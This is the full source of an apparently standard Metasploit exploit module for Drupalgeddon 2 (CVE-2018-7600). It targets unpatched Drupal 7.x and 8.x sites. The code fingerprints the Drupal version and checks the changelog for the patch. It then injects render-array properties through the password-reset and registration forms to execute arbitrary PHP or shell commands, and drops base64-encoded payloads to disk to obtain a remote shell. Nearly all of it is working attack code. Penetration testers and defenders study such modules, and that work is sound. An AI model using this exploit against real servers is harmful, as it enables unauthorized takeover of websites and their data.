# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  # XXX: CmdStager can&#039;t handle badchars
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Drupal Drupalgeddon 2 Forms API Property Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a Drupal property injection in the Forms API.

        Drupal 6.x, < 7.58, 8.2.x, < 8.3.9, < 8.4.6, and < 8.5.1 are vulnerable.
      },
      &#039;Author&#039;         => [
        &#039;Jasper Mattsson&#039;, # Vulnerability discovery
        &#039;a2u&#039;,             # Proof of concept (Drupal 8.x)
        &#039;Nixawk&#039;,          # Proof of concept (Drupal 8.x)
        &#039;FireFart&#039;,        # Proof of concept (Drupal 7.x)
        &#039;wvu&#039;              # Metasploit module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2018-7600&#039;],
        [&#039;URL&#039;, &#039;https://www.drupal.org/sa-core-2018-002&#039;],
        [&#039;URL&#039;, &#039;https://greysec.net/showthread.php?tid=2912&#039;],
        [&#039;URL&#039;, &#039;https://research.checkpoint.com/uncovering-drupalgeddon-2/&#039;],
        [&#039;URL&#039;, &#039;https://github.com/a2u/CVE-2018-7600&#039;],
        [&#039;URL&#039;, &#039;https://github.com/nixawk/labs/issues/19&#039;],
        [&#039;URL&#039;, &#039;https://github.com/FireFart/CVE-2018-7600&#039;],
        [&#039;AKA&#039;, &#039;SA-CORE-2018-002&#039;],
        [&#039;AKA&#039;, &#039;Drupalgeddon 2&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Mar 28 2018&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => [&#039;php&#039;, &#039;unix&#039;, &#039;linux&#039;],
      &#039;Arch&#039;           => [ARCH_PHP, ARCH_CMD, ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        => {&#039;BadChars&#039; => &#039;&>\&#039;&#039;},
      # XXX: Using "x" in Gem::Version::new isn&#039;t technically appropriate
      &#039;Targets&#039;        => [
        #
        # Automatic targets (PHP, cmd/unix, native)
        #
        [&#039;Automatic (PHP In-Memory)&#039;,
         &#039;Platform&#039;    => &#039;php&#039;,
         &#039;Arch&#039;        => ARCH_PHP,
         &#039;Type&#039;        => :php_memory
        ],
        [&#039;Automatic (PHP Dropper)&#039;,
         &#039;Platform&#039;    => &#039;php&#039;,
         &#039;Arch&#039;        => ARCH_PHP,
         &#039;Type&#039;        => :php_dropper
        ],
        [&#039;Automatic (Unix In-Memory)&#039;,
         &#039;Platform&#039;    => &#039;unix&#039;,
         &#039;Arch&#039;        => ARCH_CMD,
         &#039;Type&#039;        => :unix_memory
        ],
        [&#039;Automatic (Linux Dropper)&#039;,
         &#039;Platform&#039;    => &#039;linux&#039;,
         &#039;Arch&#039;        => [ARCH_X86, ARCH_X64],
         &#039;Type&#039;        => :linux_dropper
        ],
        #
        # Drupal 7.x targets (PHP, cmd/unix, native)
        #
        [&#039;Drupal 7.x (PHP In-Memory)&#039;,
         &#039;Platform&#039;    => &#039;php&#039;,
         &#039;Arch&#039;        => ARCH_PHP,
         &#039;Version&#039;     => Gem::Version.new(&#039;7.x&#039;),
         &#039;Type&#039;        => :php_memory
        ],
        [&#039;Drupal 7.x (PHP Dropper)&#039;,
         &#039;Platform&#039;    => &#039;php&#039;,
         &#039;Arch&#039;        => ARCH_PHP,
         &#039;Version&#039;     => Gem::Version.new(&#039;7.x&#039;),
         &#039;Type&#039;        => :php_dropper
        ],
        [&#039;Drupal 7.x (Unix In-Memory)&#039;,
         &#039;Platform&#039;    => &#039;unix&#039;,
         &#039;Arch&#039;        => ARCH_CMD,
         &#039;Version&#039;     => Gem::Version.new(&#039;7.x&#039;),
         &#039;Type&#039;        => :unix_memory
        ],
        [&#039;Drupal 7.x (Linux Dropper)&#039;,
         &#039;Platform&#039;    => &#039;linux&#039;,
         &#039;Arch&#039;        => [ARCH_X86, ARCH_X64],
         &#039;Version&#039;     => Gem::Version.new(&#039;7.x&#039;),
         &#039;Type&#039;        => :linux_dropper
        ],
        #
        # Drupal 8.x targets (PHP, cmd/unix, native)
        #
        [&#039;Drupal 8.x (PHP In-Memory)&#039;,
         &#039;Platform&#039;    => &#039;php&#039;,
         &#039;Arch&#039;        => ARCH_PHP,
         &#039;Version&#039;     => Gem::Version.new(&#039;8.x&#039;),
         &#039;Type&#039;        => :php_memory
        ],
        [&#039;Drupal 8.x (PHP Dropper)&#039;,
         &#039;Platform&#039;    => &#039;php&#039;,
         &#039;Arch&#039;        => ARCH_PHP,
         &#039;Version&#039;     => Gem::Version.new(&#039;8.x&#039;),
         &#039;Type&#039;        => :php_dropper
        ],
        [&#039;Drupal 8.x (Unix In-Memory)&#039;,
         &#039;Platform&#039;    => &#039;unix&#039;,
         &#039;Arch&#039;        => ARCH_CMD,
         &#039;Version&#039;     => Gem::Version.new(&#039;8.x&#039;),
         &#039;Type&#039;        => :unix_memory
        ],
        [&#039;Drupal 8.x (Linux Dropper)&#039;,
         &#039;Platform&#039;    => &#039;linux&#039;,
         &#039;Arch&#039;        => [ARCH_X86, ARCH_X64],
         &#039;Version&#039;     => Gem::Version.new(&#039;8.x&#039;),
         &#039;Type&#039;        => :linux_dropper
        ]
      ],
      &#039;DefaultTarget&#039;  => 0, # Automatic (PHP In-Memory)
      &#039;DefaultOptions&#039; => {&#039;WfsDelay&#039; => 2}
    ))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to Drupal install&#039;, &#039;/&#039;]),
      OptString.new(&#039;PHP_FUNC&#039;,  [true, &#039;PHP function to execute&#039;, &#039;passthru&#039;]),
      OptBool.new(&#039;DUMP_OUTPUT&#039;, [false, &#039;If output should be dumped&#039;, false])
    ])

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable dir for droppers&#039;, &#039;/tmp&#039;])
    ])
  end

  def check
    checkcode = CheckCode::Safe

    if drupal_version
      print_status("Drupal #{@version} targeted at #{full_uri}")
      checkcode = CheckCode::Detected
    else
      print_error(&#039;Could not determine Drupal version to target&#039;)
      return CheckCode::Unknown
    end

    if drupal_unpatched?
      print_good(&#039;Drupal appears unpatched in CHANGELOG.txt&#039;)
      checkcode = CheckCode::Appears
    end

    token = random_crap
    res   = execute_command(token, func: &#039;printf&#039;)

    if res && res.body.start_with?(token)
      checkcode = CheckCode::Vulnerable
    end

    checkcode
  end

  def exploit
    unless check == CheckCode::Vulnerable || datastore[&#039;ForceExploit&#039;]
      fail_with(Failure::NotVulnerable, &#039;Set ForceExploit to override&#039;)
    end

    if datastore[&#039;PAYLOAD&#039;] == &#039;cmd/unix/generic&#039;
      print_warning(&#039;Enabling DUMP_OUTPUT for cmd/unix/generic&#039;)
      # XXX: Naughty datastore modification
      datastore[&#039;DUMP_OUTPUT&#039;] = true
    end

    # NOTE: assert() is attempted first, then PHP_FUNC if that fails
    case target[&#039;Type&#039;]
    when :php_memory
      execute_command(payload.encoded, func: &#039;assert&#039;)

      sleep(wfs_delay)
      return if session_created?

      # XXX: This will spawn a *very* obvious process
      execute_command("php -r &#039;#{payload.encoded}&#039;")
    when :unix_memory
      execute_command(payload.encoded)
    when :php_dropper, :linux_dropper
      dropper_assert

      sleep(wfs_delay)
      return if session_created?

      dropper_exec
    end
  end

  def dropper_assert
    php_file = Pathname.new(
      "#{datastore[&#039;WritableDir&#039;]}/#{random_crap}.php"
    ).cleanpath

    # Return the PHP payload or a PHP binary dropper
    dropper = get_write_exec_payload(
      writable_path: datastore[&#039;WritableDir&#039;],
      unlink_self:   true # Worth a shot
    )

    # Encode away potential badchars with Base64
    dropper = Rex::Text.encode_base64(dropper)

    # Stage 1 decodes the PHP and writes it to disk
    stage1 = %Q{
      file_put_contents("#{php_file}", base64_decode("#{dropper}"));
    }

    # Stage 2 executes said PHP in-process
    stage2 = %Q{
      include_once("#{php_file}");
    }

    # :unlink_self may not work, so let&#039;s make sure
    register_file_for_cleanup(php_file)

    # Hopefully pop our shell with assert()
    execute_command(stage1.strip, func: &#039;assert&#039;)
    execute_command(stage2.strip, func: &#039;assert&#039;)
  end

  def dropper_exec
    php_file = "#{random_crap}.php"
    tmp_file = Pathname.new(
      "#{datastore[&#039;WritableDir&#039;]}/#{php_file}"
    ).cleanpath

    # Return the PHP payload or a PHP binary dropper
    dropper = get_write_exec_payload(
      writable_path: datastore[&#039;WritableDir&#039;],
      unlink_self:   true # Worth a shot
    )

    # Encode away potential badchars with Base64
    dropper = Rex::Text.encode_base64(dropper)

    # :unlink_self may not work, so let&#039;s make sure
    register_file_for_cleanup(php_file)

    # Write the payload or dropper to disk (!)
    # NOTE: Analysis indicates > is a badchar for 8.x
    execute_command("echo #{dropper} | base64 -d | tee #{php_file}")

    # Attempt in-process execution of our PHP script
    send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, php_file)
    )

    sleep(wfs_delay)
    return if session_created?

    # Try to get a shell with PHP CLI
    execute_command("php #{php_file}")

    sleep(wfs_delay)
    return if session_created?

    register_file_for_cleanup(tmp_file)

    # Fall back on our temp file
    execute_command("echo #{dropper} | base64 -d | tee #{tmp_file}")
    execute_command("php #{tmp_file}")
  end

  def execute_command(cmd, opts = {})
    func = opts[:func] || datastore[&#039;PHP_FUNC&#039;] || &#039;passthru&#039;

    vprint_status("Executing with #{func}(): #{cmd}")

    res =
      case @version.to_s
      when &#039;7.x&#039;
        exploit_drupal7(func, cmd)
      when &#039;8.x&#039;
        exploit_drupal8(func, cmd)
      end

    if res && res.code != 200
      print_error("Unexpected reply: #{res.inspect}")
      return
    end

    if res && datastore[&#039;DUMP_OUTPUT&#039;]
      print_line(res.body)
    end

    res
  end

  def drupal_version
    if target[&#039;Version&#039;]
      @version = target[&#039;Version&#039;]
      return @version
    end

    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => target_uri.path
    )

    return unless res && res.code == 200

    # Check for an X-Generator header
    @version =
      case res.headers[&#039;X-Generator&#039;]
      when /Drupal 7/
        Gem::Version.new(&#039;7.x&#039;)
      when /Drupal 8/
        Gem::Version.new(&#039;8.x&#039;)
      end

    return @version if @version

    # Check for a <meta> tag
    generator = res.get_html_document.at(
      &#039;//meta[@name = "Generator"]/@content&#039;
    )

    return unless generator

    @version =
      case generator.value
      when /Drupal 7/
        Gem::Version.new(&#039;7.x&#039;)
      when /Drupal 8/
        Gem::Version.new(&#039;8.x&#039;)
      end
  end

  def drupal_unpatched?
    unpatched = true

    # Check for patch level in CHANGELOG.txt
    uri =
      case @version.to_s
      when &#039;7.x&#039;
        normalize_uri(target_uri.path, &#039;CHANGELOG.txt&#039;)
      when &#039;8.x&#039;
        normalize_uri(target_uri.path, &#039;core/CHANGELOG.txt&#039;)
      end

    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    )

    return unless res && res.code == 200

    if res.body.include?(&#039;SA-CORE-2018-002&#039;)
      unpatched = false
    end

    unpatched
  end

  def exploit_drupal7(func, code)
    vars_get = {
      &#039;q&#039;                    => &#039;user/password&#039;,
      &#039;name[#post_render][]&#039; => func,
      &#039;name[#markup]&#039;        => code,
      &#039;name[#type]&#039;          => &#039;markup&#039;
    }

    vars_post = {
      &#039;form_id&#039;                  => &#039;user_pass&#039;,
      &#039;_triggering_element_name&#039; => &#039;name&#039;
    }

    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => target_uri.path,
      &#039;vars_get&#039;  => vars_get,
      &#039;vars_post&#039; => vars_post
    )

    return res unless res && res.code == 200

    form_build_id = res.get_html_document.at(
      &#039;//input[@name = "form_build_id"]/@value&#039;
    )

    return res unless form_build_id

    vars_get = {
      &#039;q&#039; => "file/ajax/name/#value/#{form_build_id.value}"
    }

    vars_post = {
      &#039;form_build_id&#039; => form_build_id.value
    }

    send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => target_uri.path,
      &#039;vars_get&#039;  => vars_get,
      &#039;vars_post&#039; => vars_post
    )
  end

  def exploit_drupal8(func, code)
    # Clean URLs are enabled by default and "can&#039;t" be disabled
    uri = normalize_uri(target_uri.path, &#039;user/register&#039;)

    vars_get = {
      &#039;element_parents&#039; => &#039;account/mail/#value&#039;,
      &#039;ajax_form&#039;       => 1,
      &#039;_wrapper_format&#039; => &#039;drupal_ajax&#039;
    }

    vars_post = {
      &#039;form_id&#039;              => &#039;user_register_form&#039;,
      &#039;_drupal_ajax&#039;         => 1,
      &#039;mail[#type]&#039;          => &#039;markup&#039;,
      &#039;mail[#post_render][]&#039; => func,
      &#039;mail[#markup]&#039;        => code
    }

    send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => uri,
      &#039;vars_get&#039;  => vars_get,
      &#039;vars_post&#039; => vars_post
    )
  end

  def random_crap
    Rex::Text.rand_text_alphanumeric(8..42)
  end

end

